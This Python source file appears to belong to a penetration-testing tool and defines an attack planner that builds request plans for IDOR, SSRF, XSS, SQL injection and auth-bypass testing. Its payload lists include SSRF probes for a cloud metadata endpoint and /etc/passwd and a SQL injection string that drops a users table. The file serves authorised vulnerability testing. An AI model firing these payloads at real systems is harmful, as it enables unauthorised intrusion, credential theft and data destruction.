from __future__ import annotations

import logging

from core.offensive.attack.models import AttackStep, TestPlan
from core.offensive.models import Hypothesis

logger = logging.getLogger("orion.core.offensive.attack_planner")

DEFAULT_TIMEOUT = 15.0
USER_AGENT = "ORION-Probe/1.0"


IDOR_PAYLOADS = [
    "999999",
    "2",
    "0",
    "-1",
    "admin",
    "null",
    "['1']",
    '{"id":1}',
    "../admin/profile",
]

SSRF_PAYLOADS = [
    "http://127.0.0.1:8080",
    "http://localhost:22",
    "http://169.254.169.254/latest/meta-data/",
    "file:///etc/passwd",
    "http://0.0.0.0:80",
    "http://[::1]:22",
    "http://10.0.0.1:80",
    "http://172.16.0.1:80",
]

XSS_PAYLOADS = [
    "<img src=x onerror=alert(1)>",
    "<script>alert(1)</script>",
    '"><script>alert(1)</script>',
    "';alert(1)//",
    "<svg onload=alert(1)>",
]

SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "1 OR 1=1",
    "' UNION SELECT NULL--",
    "' AND SLEEP(5)--",
    "1; DROP TABLE users--",
]

AUTH_BYPASS_PAYLOADS = [
    "admin",
    "administrator",
    "root",
    "test",
    "true",
    "1",
    "enabled",
]


class AttackPlanner:
    def plan(self, hypothesis: Hypothesis, base_url: str = "") -> TestPlan:
        vuln_type = hypothesis.vulnerability_type.lower()
        planner = {
            "idor": self._plan_idor,
            "ssrf": self._plan_ssrf,
            "xss": self._plan_xss,
            "sqli": self._plan_sqli,
            "auth_bypass": self._plan_auth_bypass,
        }.get(vuln_type, self._plan_generic)
        return planner(hypothesis, base_url)

    def _plan_idor(self, hypothesis: Hypothesis, base_url: str) -> TestPlan:
        path = hypothesis.endpoint or ""
        method = hypothesis.method.upper()
        param = hypothesis.parameters_of_interest[0] if hypothesis.parameters_of_interest else "id"
        plan = TestPlan(
            hypothesis_id=hypothesis.id,
            vulnerability_type="idor",
            target=base_url,
            endpoint_path=path,
            detection_strategy="status_diff",
            payloads={"idor_user_id": IDOR_PAYLOADS},
        )
        for payload in IDOR_PAYLOADS[:4]:
            plan.steps.append(
                AttackStep(
                    purpose="test_unauth",
                    method=method,
                    path=path,
                    params={param: payload},
                    payload_key="idor_user_id",
                    expected_outcome="Should return 401/403 if protected, 200 if vulnerable",
                )
            )
        plan.steps.insert(
            0,
            AttackStep(
                purpose="baseline",
                method=method,
                path=path,
                params={param: "1"},
                expected_outcome="Baseline response with valid ID",
            ),
        )
        return plan

    def _plan_ssrf(self, hypothesis: Hypothesis, base_url: str) -> TestPlan:
        path = hypothesis.endpoint or ""
        method = hypothesis.method.upper()
        param = hypothesis.parameters_of_interest[0] if hypothesis.parameters_of_interest else "url"
        plan = TestPlan(
            hypothesis_id=hypothesis.id,
            vulnerability_type="ssrf",
            target=base_url,
            endpoint_path=path,
            detection_strategy="timing",
            payloads={"ssrf_url": SSRF_PAYLOADS},
        )
        for payload in SSRF_PAYLOADS[:5]:
            plan.steps.append(
                AttackStep(
                    purpose="test",
                    method=method,
                    path=path,
                    params={param: payload},
                    payload_key="ssrf_url",
                    expected_outcome="Timeout or 502/504 indicates SSRF",
                )
            )
        plan.steps.insert(
            0,
            AttackStep(
                purpose="baseline",
                method=method,
                path=path,
                params={param: "http://example.com"},
                expected_outcome="Normal response with external URL",
            ),
        )
        return plan

    def _plan_xss(self, hypothesis: Hypothesis, base_url: str) -> TestPlan:
        path = hypothesis.endpoint or ""
        method = hypothesis.method.upper()
        param = hypothesis.parameters_of_interest[0] if hypothesis.parameters_of_interest else "q"
        plan = TestPlan(
            hypothesis_id=hypothesis.id,
            vulnerability_type="xss",
            target=base_url,
            endpoint_path=path,
            detection_strategy="content_match",
            payloads={"xss_payload": XSS_PAYLOADS},
        )
        for payload in XSS_PAYLOADS:
            plan.steps.append(
                AttackStep(
                    purpose="test",
                    method=method,
                    path=path,
                    params={param: payload},
                    payload_key="xss_payload",
                    expected_outcome="Payload reflected unescaped in response",
                )
            )
        plan.steps.insert(
            0,
            AttackStep(
                purpose="baseline",
                method=method,
                path=path,
                params={param: "test123"},
                expected_outcome="Normal response",
            ),
        )
        return plan

    def _plan_sqli(self, hypothesis: Hypothesis, base_url: str) -> TestPlan:
        path = hypothesis.endpoint or ""
        method = hypothesis.method.upper()
        param = hypothesis.parameters_of_interest[0] if hypothesis.parameters_of_interest else "id"
        plan = TestPlan(
            hypothesis_id=hypothesis.id,
            vulnerability_type="sqli",
            target=base_url,
            endpoint_path=path,
            detection_strategy="error_pattern",
            payloads={"sqli_payload": SQLI_PAYLOADS},
        )
        for payload in SQLI_PAYLOADS[:5]:
            plan.steps.append(
                AttackStep(
                    purpose="test",
                    method=method,
                    path=path,
                    params={param: payload},
                    payload_key="sqli_payload",
                    expected_outcome="SQL error or different response",
                )
            )
        plan.steps.insert(
            0,
            AttackStep(
                purpose="baseline",
                method=method,
                path=path,
                params={param: "1"},
                expected_outcome="Normal response",
            ),
        )
        return plan

    def _plan_auth_bypass(self, hypothesis: Hypothesis, base_url: str) -> TestPlan:
        path = hypothesis.endpoint or ""
        method = hypothesis.method.upper()
        param = hypothesis.parameters_of_interest[0] if hypothesis.parameters_of_interest else "role"
        plan = TestPlan(
            hypothesis_id=hypothesis.id,
            vulnerability_type="auth_bypass",
            target=base_url,
            endpoint_path=path,
            detection_strategy="status_diff",
            payloads={"bypass_payload": AUTH_BYPASS_PAYLOADS},
        )
        for payload in AUTH_BYPASS_PAYLOADS:
            plan.steps.append(
                AttackStep(
                    purpose="test",
                    method=method,
                    path=path,
                    params={param: payload},
                    payload_key="bypass_payload",
                    expected_outcome="200 with data when 401 expected",
                )
            )
        plan.steps.insert(
            0,
            AttackStep(
                purpose="baseline",
                method=method,
                path=path,
                expected_outcome="401 if auth required",
            ),
        )
        return plan

    def _plan_generic(self, hypothesis: Hypothesis, base_url: str) -> TestPlan:
        path = hypothesis.endpoint or ""
        method = hypothesis.method.upper()
        plan = TestPlan(
            hypothesis_id=hypothesis.id,
            vulnerability_type=hypothesis.vulnerability_type,
            target=base_url,
            endpoint_path=path,
            detection_strategy="behavioral_diff",
            payloads={},
        )
        plan.steps.append(AttackStep(purpose="baseline", method=method, path=path, expected_outcome="Normal baseline"))
        for param in hypothesis.parameters_of_interest[:3]:
            plan.steps.append(
                AttackStep(
                    purpose="test",
                    method=method,
                    path=path,
                    params={param: "test_value_123"},
                    expected_outcome="Check for behavioral difference",
                )
            )
        return plan
